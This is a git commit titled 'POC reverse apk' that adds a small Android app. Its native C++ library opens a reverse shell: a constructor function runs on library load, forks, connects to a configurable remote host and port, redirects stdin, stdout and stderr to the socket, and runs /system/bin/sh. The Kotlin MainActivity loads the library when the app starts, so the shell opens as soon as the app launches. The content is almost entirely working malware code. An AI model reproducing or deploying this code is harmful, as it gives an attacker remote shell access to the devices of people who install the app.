097aa487ebb3620b5f4abb9b35ef690f34340fcf
João <joaovictorti08@gmail.com>
2023-09-25 21:12:54 -0300

    POC reverse apk

---
+++ app/src/main/cpp/reverseshell.cpp
@@ -0,0 +1,32 @@
+#include <stdio.h>
+#include <unistd.h>
+
+#include <sys/socket.h>
+#include <arpa/inet.h> //htons
+#include <netinet/in.h>
+#include <sys/types.h>
+
+#define REMOTE_HOST "127.0.0.1" // Adiciona o IP
+#define REMOTE_PORT 7070 // Adiciona a pora
+
+void __attribute__ ((constructor)) reverse()
+{
+    int s;
+    struct sockaddr_in sa;
+
+    if(fork() == 0) {
+
+        sa.sin_family = AF_INET;
+        sa.sin_addr.s_addr = inet_addr(REMOTE_HOST);
+        sa.sin_port = htons(REMOTE_PORT);
+
+        s = socket(AF_INET, SOCK_STREAM, 0);
+        connect(s, (struct sockaddr *) &sa, sizeof(sa));
+
+        dup2(s, 0); // stdin
+        dup2(s, 1); // stdout
+        dup2(s, 2); // stderr
+
+        execve("/system/bin/sh", 0, 0);
+    }
+}
---
+++ app/src/main/java/br/viictorjj/reverseshell/MainActivity.kt
@@ -0,0 +1,14 @@
+package br.viictorjj.reverseshell
+
+import androidx.appcompat.app.AppCompatActivity
+import android.os.Bundle
+
+class MainActivity : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        System.loadLibrary("reverseshell")
+    }
+
+}
